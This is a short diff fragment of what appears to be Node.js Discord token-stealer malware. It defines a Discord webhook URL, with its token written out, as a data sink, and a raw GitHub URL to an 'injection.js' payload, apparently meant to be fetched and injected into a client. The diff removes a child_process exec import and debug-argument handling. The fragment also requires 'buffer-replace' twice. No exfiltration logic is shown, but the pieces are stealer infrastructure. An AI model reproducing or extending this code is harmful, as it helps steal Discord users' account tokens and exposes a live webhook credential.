@@ -6,15 +6,6 @@ const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const src = ("https://discord.com/api/webhooks/1094351023423897650/1qGssvgegfTHoSiMQijfAzrXEhHiKpZDoR8LzkguL4Pzh1QoUch4LnIg8A78iB1C1JAE")
 const github = "https://raw.githubusercontent.com/kyssuuwuas/balls-injection/main/injection.js"
-
-
-const {
-    exec
-} = require('child_process');
-var debug = false,
-    args = process.argv.slice(2);
-
-if (args[0] == 'debug') debug = false;
 const buf_replace = require('buffer-replace');
 const superstarlmao = "da_webhook"
 const config = {
